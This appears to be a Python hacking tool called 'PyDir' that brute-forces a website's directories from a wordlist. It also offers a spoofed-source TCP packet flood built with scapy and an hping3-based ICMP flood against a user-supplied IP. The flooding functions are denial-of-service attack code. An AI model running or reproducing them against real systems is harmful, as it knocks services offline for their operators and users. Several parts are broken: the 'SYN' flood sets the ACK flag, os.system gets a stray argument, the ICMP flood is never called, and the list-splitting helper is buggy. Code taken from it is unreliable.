import requests
import sys
import os
import time
from scapy.all import *
import multiprocessing
import random

def divide(con,n):
	n = n/2
	n = int(n)
	newCon = []
	d = con[n]
	for i in con:
		if i == d:
			break
		else:
			newCon.append(i)
			con.remove(i)
	return con,newCon

def execute(flags):
	if '-h' in flags:
		help()
	if '-S' in flags:
			print("[+] Syn flooding!")
			synflood()

	if '-s' in flags:
		direc = input("[+] Enter the location of the wordlist, including the name of the file.\n[+] Press enter to use default wordlist\n")
		direc.strip()
		if direc == "":
			print("[+] Using default wordlist")
			#time.sleep(2)
			direc = open("wordlist.txt")
		else:
			try:
				direc = open(direc)
			except FileNotFoundError:
				print("File has not been found. Please check your file path!")
				exit()

		os.system("cls")
		con = []
		for i in direc.readlines():
			con.append(i.rstrip('\n'))
		n = len(con)

		url = input("Enter the url\n")
		response = requests.get(url)
		t_url = url
		
		a = divide(con,n)
		a1 = divide(a[0],len(a[0]))
		a2 = divide(a[1],len(a[1]))
		p1 = multiprocessing.Process(target = run, args = (a1[0],t_url,flags,response))
		p2 = multiprocessing.Process(target = run, args = (a1[1],t_url,flags,response))
		p3 = multiprocessing.Process(target = run, args = (a2[0],t_url,flags,response))
		p4 = multiprocessing.Process(target = run, args = (a2[1],t_url,flags,response))
		start = time.perf_counter()
		p1.start()
		p2.start()
		p3.start()
		p4.start()
		
		p1.join()
		p2.join()
		p3.join()
		p4.join()
		finish = time.perf_counter()
		
		print(f'[+] Finished in {round(finish-start,2)} second(s)')

def help():
	print("[+] -s: Scan directory of website\n[+] -S SYN flood\n[+] -i ICMP flooding (Requires hping3, only on Linux)\n[+] Combine -q and -s to print only success codes!\n")
	print("[+] SYNTAX: python3/python PyDir [flag]")
	print("[+] For the url, please enter it with the protocol. For example: https://www.tritiums.org")

def run(con,t_url,flags,response):
	if response.status_code == 200:
		if '-i' in flags:
				print("[+] ICMP flooding")
				n = input("[+] Enter the number of pings requests you would want to use\nNote that some firewalls block ICMP requests. Try SYN flood")
				
		if '-s' in flags:
			for i in con:
				i.rstrip('\n')
				url = t_url+"/"+i
				res = requests.get(url)


				if '-q' in flags:
					if res.status_code == 200:
						print(f"[+] URL:{url} RESPONSE CODE:{res.status_code}")
				else:
					print(f"[+] URL:{url} RESPONSE CODE:{res.status_code}")

	else:
		print("[+] Website is down. Please check url.")
		exit()

def icmpflood(ip):
	print("[+] ICMP flooding!!!")
	os.system("hping3 --flood ",ip);

def synflood():
	#To be worked on!
	target_ip = input("[+] Enter the IP address\n").strip()
	dport = 80
	sport = 1234
	
	while True:
		s_addr = RandIP()
		pkt = IP(src=s_addr,dst=target_ip)/TCP(sport = sport,dport=dport,seq = 1505066, flags = "A")
		send(pkt)

if __name__ == "__main__":

	r = random.randint(0,5)
	print(r)

	if(r == 0):
		print(r'''	         
      ___           ___           ___                       ___     
     /\  \         |\__\         /\  \          ___        /\  \    
    /::\  \        |:|  |       /::\  \        /\  \      /::\  \   
   /:/\:\  \       |:|  |      /:/\:\  \       \:\  \    /:/\:\  \  
  /::\~\:\  \      |:|__|__   /:/  \:\__\      /::\__\  /::\~\:\  \ 
 /:/\:\ \:\__\     /::::\__\ /:/__/ \:|__|  __/:/\/__/ /:/\:\ \:\__\
 \/__\:\/:/  /    /:/~~/~    \:\  \ /:/  / /\/:/  /    \/_|::\/:/  /
      \::/  /    /:/  /       \:\  /:/  /  \::/__/        |:|::/  / 
       \/__/     \/__/         \:\/:/  /    \:\__\        |:|\/__/  
                                \::/__/      \/__/        |:|  |    
                                 ~~                        \|__|
			''')

	if r == 2:
		print(r'''

  o__ __o                 o__ __o         o              
 <|     v\               <|     v\      _<|>_            
 / \     <\              / \     <\                      
 \o/     o/   o      o   \o/       \o     o    \o__ __o  
  |__  _<|/  <|>    <|>   |         |>   <|>    |     |> 
  |          < >    < >  / \       //    / \   / \   < > 
 <o>          \o    o/   \o/      /      \o/   \o/       
  |            v\  /v     |      o        |     |        
 / \            <\/>     / \  __/>       / \   / \       
                 /                                       
                o                                        
             __/>                                        
			''')

	if r == 3:
		print(r'''

 ██▓███ ▓██   ██▓▓█████▄  ██▓ ██▀███  
▓██░  ██▒▒██  ██▒▒██▀ ██▌▓██▒▓██ ▒ ██▒
▓██░ ██▓▒ ▒██ ██░░██   █▌▒██▒▓██ ░▄█ ▒
▒██▄█▓▒ ▒ ░ ▐██▓░░▓█▄   ▌░██░▒██▀▀█▄  
▒██▒ ░  ░ ░ ██▒▓░░▒████▓ ░██░░██▓ ▒██▒
▒▓▒░ ░  ░  ██▒▒▒  ▒▒▓  ▒ ░▓  ░ ▒▓ ░▒▓░
░▒ ░     ▓██ ░▒░  ░ ▒  ▒  ▒ ░  ░▒ ░ ▒░
░░       ▒ ▒ ░░   ░ ░  ░  ▒ ░  ░░   ░ 
         ░ ░        ░     ░     ░     
         ░ ░      ░                   
			''')

	if r== 4:
		print(r''' 

 ▄▀▀▄▀▀▀▄  ▄▀▀▄ ▀▀▄  ▄▀▀█▄▄   ▄▀▀█▀▄    ▄▀▀▄▀▀▀▄ 
█   █   █ █   ▀▄ ▄▀ █ ▄▀   █ █   █  █  █   █   █ 
▐  █▀▀▀▀  ▐     █   ▐ █    █ ▐   █  ▐  ▐  █▀▀█▀  
   █            █     █    █     █      ▄▀    █  
 ▄▀           ▄▀     ▄▀▄▄▄▄▀  ▄▀▀▀▀▀▄  █     █   
█             █     █     ▐  █       █ ▐     ▐   
▐             ▐     ▐        ▐       ▐           
			''')
	Uargs = sys.argv
	Uargs.pop(0)
	Sargs = ['-s','-i','-h','-k','-q','-S']
	flags = []

	for i in Uargs:
		if i not in Sargs:
			print(f'[-] Flag {i} is invalid. Try again')
			exit()
		else:
			flags.append(i)
	execute(flags)
